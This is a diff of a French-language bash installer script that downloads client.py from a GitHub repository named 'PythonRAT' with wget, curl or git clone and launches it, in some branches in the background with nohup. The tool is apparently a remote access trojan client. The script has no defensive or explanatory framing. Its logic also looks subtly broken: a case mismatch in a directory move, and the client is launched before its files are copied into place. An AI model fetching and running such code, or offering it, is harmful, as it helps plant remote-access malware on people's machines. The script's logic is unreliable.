@@ -43,31 +43,37 @@ confirm() {
 display_flashing_banner
 
 # Télécharger le client.py avec wget
-confirm "\e[1;34mVoulez-vous télécharger client.py avec \e[1;35mwget" && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py
+confirm "\e[1;34mVoulez-vous télécharger client.py avec \e[1;35mwget" && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py && wget https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/requirements.txt
 
 # Vérifier si le téléchargement avec wget a réussi
 if [ $? -ne 0 ]; then
     # Essayer de télécharger avec curl
     confirm "\e[1;34mLe téléchargement avec wget a échoué. Voulez-vous essayer avec \e[1;35mcurl" && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/client.py && curl -O https://raw.githubusercontent.com/tucommenceapousser/PythonRAT/main/src/requirements.txt
+
+    # Vérifier si le téléchargement avec curl a réussi
+    if [ $? -ne 0 ]; then
+        # Cloner le repo en cas d'échec avec wget et curl
+        confirm "\e[1;34mLe téléchargement avec curl a échoué. Voulez-vous cloner le repo avec \e[1;35mgit" && git clone https://github.com/tucommenceapousser/PythonRAT && mv PythonRat src
+        cd ./  || exit
+
+        # Lancer le client.py
+        confirm "Voulez-vous lancer client.py?" "\e[1;35m" && python src/client.py
+    fi
+else
+    # Lancer le client.py téléchargé avec wget
+    confirm "Voulez-vous lancer client.py téléchargé avec \e[1;34mwget\e[0m?" && nohup python src/client.py &
 fi
 
-# Vérifier si le téléchargement avec curl a réussi
-if [ $? -ne 0 ]; then
-    # Cloner le repo en cas d'échec avec wget et curl
-    confirm "\e[1;34mLe téléchargement avec curl a échoué. Voulez-vous cloner le repo avec \e[1;35mgit" && git clone https://github.com/tucommenceapousser/PythonRAT && mv PythonRAT/src/client.py src/ && mv PythonRAT/src/requirements.txt src/ && rm -rf PythonRAT
-    cd ./ || exit
-
-    # Vérifier si le répertoire "src" existe déjà
-    if [ -d "src" ]; then
-        echo -e "\e[1;33mLe répertoire 'src' existe déjà.\e[0m"
-    else
-        # Créer le répertoire "src" s'il n'existe pas
-        mkdir src
-    fi
-
-    # Lancer le client.py
-    confirm "Voulez-vous lancer client.py?" "\e[1;35m" && python src/client.py
+# Vérifier si le répertoire "src" existe déjà
+if [ -d "src" ]; then
+    echo -e "\e[1;33mLe répertoire 'src' existe déjà. Ignorer la création.\e[0m"
 else
-    # Lancer le client.py téléchargé avec curl
-    confirm "Voulez-vous lancer client.py téléchargé avec" "\e[1;34mcurl" && mkdir src && cp requirements.txt src/ && cp client.py src/ && pip install -r src/requirements.txt --force --use-feature=content-addressable-pool && nohup python src/client.py &
+    # Créer le répertoire "src" s'il n'existe pas
+    confirm "\e[1;34mLe répertoire 'src' n'existe pas. Voulez-vous le créer?" && mkdir src
+fi
+
+# Déplacer les fichiers dans le répertoire "src" s'il a été créé
+if [ -d "src" ]; then
+    cp client.py src/
+    cp requirements.txt src/
 fi
